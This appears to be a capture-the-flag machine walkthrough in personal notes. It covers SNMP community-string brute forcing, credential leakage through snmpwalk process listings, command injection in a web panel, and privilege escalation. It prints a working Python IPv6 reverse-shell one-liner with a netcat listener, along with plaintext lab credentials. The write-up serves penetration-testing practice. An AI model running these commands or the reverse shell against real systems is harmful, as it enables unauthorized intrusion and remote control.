with a conventional scan with [[nmap]] with [[Transmission Control Protocol (TCP)]] we just find open [[port 22]], and [[port 3366]] that's a Web but need credentials so there is little we can do. 
but, with [[whatweb]] we can find this
![[Pasted image 20250417064120.png]]
the service are running with python, by the way.
with [[User Datagram Protocol (UDP)]] we found [[port 161]] open, default service here is [[Simple Network Management Protocol (snmp)]]. 

then to enumerate **snmp** we must to know a *community string*. so we going to use [[Brute force]] to get that.
A tool [[onesixtyone]] allows you execute a brute force attack for get a community string using a dictionary.

```bash
onesixtyone 10.10.10.92 -c /usr/share/Discovery/DNMP/common-snmp-community-strings-onesixtyone.txtjj
```

![[Pasted image 20250417051842.png]]
we found the community string is *public*.
and now we can use [[snmpwalk]] to get some information like [[IPv6]] address
```bash
snmpwalk -v2c -c public 10.10.10.92 ipAddressType
```
![[Pasted image 20250417063253.png]]
we get that data. Correctly formatted `dead:beef:0000:0000:0250:56ff:fe94:35c3` is the [[IPv6]] of the machine so adding the parameter `-6` to nmap we can do a normal scan with ipv6 addresses and got the [[port 80]] open.
if in our browser write this
![[Pasted image 20250417063557.png]]
we can see the page running on port 80.

so, [[Simple Network Management Protocol (snmp)]] is exposed, we have a possibility of enumerate processes with snmp with `hrSWRunName` and filter by [[Python]]

```bash
snmpwalk -v2c -c public 10.10.10.92 hrSWRunName | grep python
```
![[Pasted image 20250417064632.png]]
and then filter by tables with that identifier
![[Pasted image 20250417065200.png]]
we have the one liner that execute the web page on port 3366.

```bash
python -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki ...
```
then if we try that user and password in `10.10.10.92:3366`:
![[Pasted image 20250417170127.png]]

| Username | Password            |
| -------- | ------------------- |
| loki     | godofmischiefisloki |
| loki     | trickeryanddeceit   |
Trying that with this credentials with commons usernames on web on port 80 via IPv6 we were able to enter with `administrator:trickeryanddeceit`
![[Pasted image 20250417171140.png]]
by default at press execute the command is successful executed but not display the output, if we concatenate `;` now display the output.
![[Pasted image 20250417171414.png]]
we have problems trying establish a reverse shell via IPv4 so with python can use IPv6
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:4::1002",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

and listen with [[netcat (nc)]]
```bash
nc -nv -l dead:beef:4::1002 9001
```
the execution code panel says in home directory we going to get a `credentials` file and indeed.
![[Pasted image 20250417173805.png]]
with this credentials we can connect as `loki` via [[ssh]]
![[Pasted image 20250417174027.png]]

Read the `.bash_history`
![[Pasted image 20250417174209.png]]
that pass maybe could be of root user but at try use `su` to change the user u can't.
![[Pasted image 20250417174323.png]]
using [[getfacl]] to display privileges user `loki` has a restriction

then we can change of user to root with `www-data`.
![[Pasted image 20250417174457.png]]